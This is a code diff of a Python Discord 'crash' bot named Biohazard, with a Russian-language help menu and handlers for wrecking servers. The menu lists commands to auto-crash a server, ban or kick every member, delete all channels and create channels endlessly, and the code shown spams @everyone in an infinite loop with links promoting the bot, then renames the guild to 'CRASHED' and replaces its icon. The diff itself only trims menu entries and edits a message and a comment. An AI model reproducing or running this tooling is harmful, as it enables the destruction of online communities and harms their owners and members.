@@ -25,9 +25,6 @@ class MyClient(discord.Client):
 			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
 			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
 			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
-			embed.add_field(name='*заразаканал', value='Заразить текущий канал', inline=False)
-			embed.add_field(name='*заразаканалы', value='Заразить все каналы', inline=False)
-			embed.add_field(name='*заразароли', value='Заразить все роли', inline=False)
 			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
 			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
 			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
@@ -89,7 +86,7 @@ class MyClient(discord.Client):
 				await asyncio.sleep(0.1)
 				try:
 					while True: #бесконечный цикл
-						await message.channel.send('@everyone Внимание, сервер крашится. С любовью, Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
+						await message.channel.send('@everyone Внимание, сервер крашится. С любовью, <:biohazardbot:732584678313427008> Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
 				except:
 					pass
 				
@@ -121,7 +118,7 @@ class MyClient(discord.Client):
 				await message.delete()
 				await asyncio.sleep(0.1)
 				try:
-					await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание на Crash by Respect
+					await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание
 					with open('chaos.jpeg', 'rb') as f:
 						icon = f.read()
 					await message.guild.edit(icon=icon)
